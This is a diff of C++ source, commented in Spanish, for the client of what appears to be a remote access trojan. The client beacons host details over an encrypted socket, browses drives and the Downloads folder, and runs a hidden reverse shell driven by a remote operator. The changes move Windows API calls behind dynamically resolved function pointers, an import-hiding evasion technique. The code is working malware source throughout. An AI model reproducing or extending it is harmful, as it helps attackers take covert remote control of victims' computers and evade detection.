@@ -300,7 +300,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             if (nuevo_archivo.ssOutfile.get()->is_open()) {
                 this->Agregar_Archivo_Descarga(nuevo_archivo, strIn[2]);
             }else {
-                _DBG_("[X] No se pudo abrir el archivo", GetLastError());
+                _DBG_("[X] No se pudo abrir el archivo", this->mod_dynamic->KERNEL32.pGetLastError());
             }
         }else {
             __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
@@ -336,28 +336,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     //Listar drives
     if (iComando == EnumComandos::FM_Discos) {
-        std::vector<struct sDrives> vDrives = Drives();
-        std::string strDipositivos = ""; //std::to_string(EnumComandos::FM_Discos_Lista);
-        strDipositivos.append(1, CMD_DEL);
-        for (auto dev : vDrives) {
-            std::string sLetter = dev.cLetter;
-            std::string sFree = std::to_string(dev.dFree);
-            std::string sTotal = std::to_string(dev.dTotal);
-            std::string strTemp = sLetter.substr(0, sLetter.length() - 2);
-            strTemp.append(1, '|');
-            strTemp += dev.cType;
-            strTemp.append(1, '|');
-            strTemp += dev.cLabel;
-            strTemp.append(1, '|');
-            strTemp += sFree.substr(0, sFree.length() - 4);
-            strTemp.append(1, '|');
-            strTemp += sTotal.substr(0, sTotal.length() - 4);
-            strTemp.append(1, CMD_DEL);
-
-            strDipositivos += strTemp;
-        }
-        strDipositivos.pop_back();
-        
+        std::string strDipositivos = strDrivesData();
         this->cChunkSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size(), 0, true, nullptr, EnumComandos::FM_Discos_Lista);
         return;
     }
@@ -759,7 +738,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             strPaquete.pop_back();
             this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::RD_Lista_Salida);
         }else {
-            _DBG_("No se obtuvieron monitores ? ", GetLastError());
+            _DBG_("No se obtuvieron monitores ? ", this->mod_dynamic->KERNEL32.pGetLastError());
         }
         return;
     }
@@ -1185,12 +1164,16 @@ void Cliente::MainLoop() {
 }
 
 void Cliente::iniPacket() {
+    if (!this->mod_dynamic->KERNEL32.pGetCurrentProcessId) {
+        __DBG_("[X]iniPacket no se cargo la funcion");
+        return;
+    }
     //Enviar SO
     std::string strOut = strOS();
     strOut.append(1, CMD_DEL);
     strOut += strUserName();
     strOut.append(1, CMD_DEL);
-    strOut += std::to_string(GetCurrentProcessId());
+    strOut += std::to_string(this->mod_dynamic->KERNEL32.pGetCurrentProcessId());
     strOut.append(1, CMD_DEL);
     strOut += strCpu();
     strOut.append(1, CMD_DEL);
@@ -1242,7 +1225,11 @@ int Cliente::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFla
             nPaquete.uiIsUltimo = iDataSize == 0 ? 1 : 0;
             nPaquete.cBuffer.resize(iChunkSize);
             if (nPaquete.cBuffer.size() < iChunkSize) {
-                _DBG_("[CHUNK] No se pudo reservar memoria", GetLastError());
+                if (this->mod_dynamic->KERNEL32.pGetLastError) {
+                    _DBG_("[CHUNK] No se pudo reservar memoria", this->mod_dynamic->KERNEL32.pGetLastError());
+                }else {
+                    __DBG_("[CHUNK] No se pudo reserver memoria");
+                }
                 return SOCKET_ERROR;
             }
 
@@ -1316,7 +1303,12 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
     iDataSize = cData.size();
     if (iDataSize == 0) {
-        _DBG_("[cSend] Error cifrando los datos", GetLastError());
+        if (this->mod_dynamic->KERNEL32.pGetLastError) {
+            _DBG_("[cSend] Error cifrando los datos", this->mod_dynamic->KERNEL32.pGetLastError());
+        }
+        else {
+            __DBG_("[cSend] Error cifrando los datos");
+        }
         return -1;
     }
 
@@ -1333,13 +1325,19 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     if (isBlock) {
         //Hacer el socket block
         if (this->mod_dynamic->WS32.pIoctlSocket(pSocket, FIONBIO, &iBlock) != 0) {
-            _DBG_("[cSend] No se pudo hacer block", GetLastError());
+            if (this->mod_dynamic->KERNEL32.pGetLastError) {
+                _DBG_("[cSend] No se pudo hacer block", this->mod_dynamic->KERNEL32.pGetLastError());
+            }else {
+                __DBG_("[cSend] No se pudo hacer block");
+            }
         }
     }
     
     iEnviado = send_all(pSocket, cBufferFinal.data(), iDataSize, pFlags);
     if (err_code != nullptr) {
-        *err_code = GetLastError();
+        if (this->mod_dynamic->KERNEL32.pGetLastError) {
+            *err_code = this->mod_dynamic->KERNEL32.pGetLastError();
+        }
     }
 
     //Restaurar
@@ -1454,7 +1452,12 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
     iRecibido = bOut.size();
     if (iRecibido == 0) {
-        _DBG_("[cRecv] No se pudo desencriptar el buffer", GetLastError());
+        if (this->mod_dynamic->KERNEL32.pGetLastError) {
+            _DBG_("[cRecv] No se pudo desencriptar el buffer", this->mod_dynamic->KERNEL32.pGetLastError());
+        }
+        else {
+            __DBG_("[cRecv] No se pudo desencriptar el buffer");
+        }
         return 0;
     }
 
@@ -1462,7 +1465,11 @@ int Cliente::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool
     if (pBuffer.size() == iRecibido) {
         m_memcpy(pBuffer.data(), bOut.data(), iRecibido);
     }else {
-        _DBG_("[cRecv] No se pudo reservar memoria para el buffer de salida", GetLastError());
+        if (this->mod_dynamic->KERNEL32.pGetLastError) {
+            _DBG_("[cRecv] No se pudo reservar memoria para el buffer de salida", this->mod_dynamic->KERNEL32.pGetLastError());
+        }else {
+            __DBG_("[cRecv] No se pudo reservar memoria para el buffer de salida");
+        }
         return 0;
     }
     return iRecibido;
@@ -1490,7 +1497,13 @@ bool Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int b
     if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
         m_memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
     }else {
-        _DBG_("[DESER] No se pudo reservar memoria", GetLastError());
+        if (this->mod_dynamic->KERNEL32.pGetLastError) {
+            _DBG_("[DESER] No se pudo reservar memoria", this->mod_dynamic->KERNEL32.pGetLastError());
+        }
+        else {
+            __DBG_("[DESER] No se pudo reservar memoria");
+        }
+        
         return false;
     }
     return true;
@@ -1537,19 +1550,23 @@ std::string Cliente::ObtenerDesk() {
 }
 
 std::string Cliente::ObtenerDown() {
+    if (!this->mod_dynamic->KERNEL32.pGetEnvironmentVariableA || !this->mod_dynamic->KERNEL32_FM.pFindFirstFileA) {
+        __DBG_("[X]ObtenerDown no se cargaron las funciones")
+            return std::string("-");
+    }
     TCHAR szTemp[MAX_PATH];
     std::string strRutaDesc = "";
     WIN32_FIND_DATA win32Archivo_1;
-    if (GetEnvironmentVariable("USERPROFILE", (LPSTR)szTemp, sizeof(szTemp)) > 0) {
+    if (this->mod_dynamic->KERNEL32.pGetEnvironmentVariableA("USERPROFILE", (LPSTR)szTemp, sizeof(szTemp)) > 0) {
         strRutaDesc = szTemp;
         strRutaDesc += "\\Descargas";
-        if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
+        if (this->mod_dynamic->KERNEL32_FM.pFindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
             return strRutaDesc + "\\";
         }
         else {
             strRutaDesc = szTemp;
             strRutaDesc += "\\Downloads";
-            if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
+            if (this->mod_dynamic->KERNEL32_FM.pFindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
                 return strRutaDesc + "\\";
             }
             else {
@@ -1565,6 +1582,9 @@ std::string Cliente::ObtenerDown() {
 
 //Reverse shell
 bool ReverseShell::SpawnShell(const char* pstrComando) {
+    if (!cCliente->mod_dynamic->KERNEL32.pGetStartupInfoA || cCliente->mod_dynamic->KERNEL32.pCreateProcessA) {
+        __DBG_("[X]SpawnShell no se cargaron las funciones");
+    }
     __DBG_("Lanzando " + std::string(pstrComando));
 
     this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
@@ -1574,28 +1594,32 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     sa.bInheritHandle = true;
     if (cCliente->mod_dynamic->KERNEL32.pCreatePipe) {
         if (!cCliente->mod_dynamic->KERNEL32.pCreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !cCliente->mod_dynamic->KERNEL32.pCreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
-            cCliente->m_RemoteLog("[SHELL] CreatePipe error: " + std::to_string(GetLastError()));
+            DWORD err = 0;
+            if(cCliente->mod_dynamic->KERNEL32.pGetLastError){
+                err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+            }
+            cCliente->m_RemoteLog("[SHELL] CreatePipe error: " + std::to_string(err));
             __DBG_("Error creando tuberias");
             return false;
         }
         STARTUPINFO si;
-        GetStartupInfo(&si);
+        cCliente->mod_dynamic->KERNEL32.pGetStartupInfoA(&si);
         si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
         si.hStdOutput = this->stdoutWr;
         si.hStdError = this->stdoutWr;
         si.hStdInput = this->stdinRd;
 
-        if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA) {
-            if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
-                cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(GetLastError()));
-                __DBG_("No se pudo spawnear la shell");
-                return false;
+        if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
+            DWORD err = 0;
+            if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+                err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
             }
-        }else {
+            cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(err));
+            __DBG_("No se pudo spawnear la shell");
             return false;
         }
-
+        
         //La shell esta corriendo
         this->isRunning = true;
         cCliente->m_RemoteLog("[SHELL] Corriendo...");
@@ -1712,7 +1736,11 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     //stdinWr tuberia de entrada
     if (cCliente->mod_dynamic->KERNEL32.pWriteFile) {
         if (!cCliente->mod_dynamic->KERNEL32.pWriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
-            cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(GetLastError()));
+            DWORD err = 0;
+            if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
+                err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
+            }
+            cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(err));
             __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
             this->StopShell();
         }
